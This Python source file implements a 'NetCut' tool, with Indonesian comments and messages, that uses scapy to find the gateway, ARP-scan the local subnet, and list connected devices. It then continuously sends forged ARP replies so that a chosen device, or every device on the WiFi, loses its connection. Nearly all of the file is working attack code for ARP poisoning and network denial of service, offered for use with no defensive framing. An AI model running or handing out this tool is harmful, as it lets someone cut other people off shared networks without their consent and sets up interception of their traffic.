import os
import time
import socket
import subprocess
from scapy.all import ARP, Ether, srp, sendp

class NetCut:
    def __init__(self, config, colors):
        self.config = config
        self.colors = colors
        self.is_running = False

    def get_gateway_ip(self):
        """ Ambil IP Gateway (Router) otomatis """
        try:
            cmd = "ip route | grep default | awk '{print $3}'"
            gateway = subprocess.check_output(cmd, shell=True).decode().strip()
            return gateway if gateway else None
        except:
            return None

    def get_ssid(self):
        """ Ambil nama WiFi yang sedang terkoneksi """
        try:
            ssid = subprocess.check_output("iwgetid -r", shell=True).decode().strip()
            return ssid if ssid else "Unknown WiFi"
        except:
            return "Local Network"

    def get_hostname(self, ip):
        """ Cari nama perangkat (Android, iPhone, Laptop) """
        try:
            # timeout 0.5 detik biar scan gak lambat
            return socket.gethostbyaddr(ip)[0]
        except:
            return "Unknown Device"

    def scan_network(self, gateway_ip):
        c = self.colors
        print(f"\n  {c.INFO} Mencari target di {gateway_ip}/24...")
        
        # ARP scan untuk satu subnet
        request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=f"{gateway_ip}/24")
        ans, unans = srp(request, timeout=2, verbose=False)
        
        clients = []
        for sent, received in ans:
            if received.psrc != gateway_ip:
                # Ambil hostname pas lagi scan biar user tinggal pilih
                name = self.get_hostname(received.psrc)
                clients.append({'ip': received.psrc, 'mac': received.hwsrc, 'name': name})
        return clients

    def spoof(self, target_ip, target_mac, gateway_ip):
        """ ARP Poisoning dengan Layer 2 Ethernet (No Warnings) """
        if not target_mac:
            return False
        # Kita bilang ke Target: "Gue adalah Router lo"
        packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        sendp(packet, verbose=False)
        return True

    def start_attack(self):
        c = self.colors
        gw_ip = self.get_gateway_ip()
        ssid = self.get_ssid()
        
        if not gw_ip:
            print(f"  {c.R}[!] Gagal deteksi Gateway! Konek WiFi dulu, Bre.{c.NC}")
            return

        clients = self.scan_network(gw_ip)
        if not clients:
            print(f"  {c.R}[!] Jaringan sepi, gak ada target.{c.NC}")
            return

        print(f"\n  {c.B}[ DAFTAR TARGET DI {ssid.upper()} ]{c.NC}")
        print(f"  {c.W}No   IP Address      Device Name{c.NC}")
        print(f"  --   ----------      -----------")
        for i, client in enumerate(clients):
            print(f"  [{i+1}]  {client['ip']:15} {c.G}{client['name']}{c.NC}")
        
        try:
            val = input(f"\n  {c.Q} Pilih No (atau 'all'): ").strip()
            self.is_running = True
            
            if val.lower() == 'all':
                targets = clients
                print(f"\n  {c.Y}[*] Target : {c.W}{ssid} {c.R}(ALL DEVICES){c.NC}")
            else:
                idx = int(val) - 1
                targets = [clients[idx]]
                print(f"\n  {c.Y}[*] Target : {c.W}{ssid} {c.G}({targets[0]['ip']} // {targets[0]['name']}){c.NC}")

            print(f"  {c.Y}[*] NetCut Aktif. Memutus koneksi...{c.NC}")
            print(f"  {c.INFO} Tekan Ctrl+C untuk berhenti.")

            while self.is_running:
                for t in targets:
                    self.spoof(t['ip'], t['mac'], gw_ip)
                time.sleep(2)

        except KeyboardInterrupt:
            print(f"\n  {c.G}[+] Stopped. Koneksi target akan segera pulih.{c.NC}")
            self.is_running = False
        except Exception as e:
            print(f"  {c.R}[!] Error: {e}{c.NC}")
            self.is_running = False
